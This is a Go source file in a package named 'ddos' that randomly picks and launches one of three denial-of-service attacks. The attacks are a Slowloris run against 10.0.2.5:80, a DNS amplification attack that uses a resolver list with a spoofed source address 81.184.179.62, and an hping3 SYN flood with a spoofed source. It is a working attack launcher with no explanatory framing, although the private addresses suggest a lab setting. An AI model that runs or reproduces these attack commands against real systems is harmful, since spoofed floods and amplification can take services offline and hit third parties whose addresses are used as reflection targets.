package ddos

import (
	"fmt"
	"log"
	"math/rand"
	"os/exec"
	"time"
)

func main() {

	x := randomNumber()
	fmt.Println(x)

	switch x {
	case 1:
		fmt.Println("------------------------Starting Slowloris Attack------------------------")
		out, err := exec.Command("./slowloris", "10.0.2.5:80").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	case 2:
		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", "81.184.179.62", "-l", "10000").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	case 3:
		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
		out, err := exec.Command("hping3", "--syn", "10.0.2.5", "-p", "9999", "--flood", "--spoof", "10.0.0.1").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}

func randomNumber() int {
	rand.Seed(time.Now().UnixNano())
	min := 1
	max := 3
	return rand.Intn(max-min+1) + min
}

/*
	cmd := exec.Command("/home/marti/Desktop/mlw/hello.sh")
	err := cmd.Run()
	//out, err := exec.Command("/home/marti/Desktop/mlw/hello.sh").Output()
	if err != nil {
		log.Fatal(err)
	}
	//fmt.Println(string(out))
*/
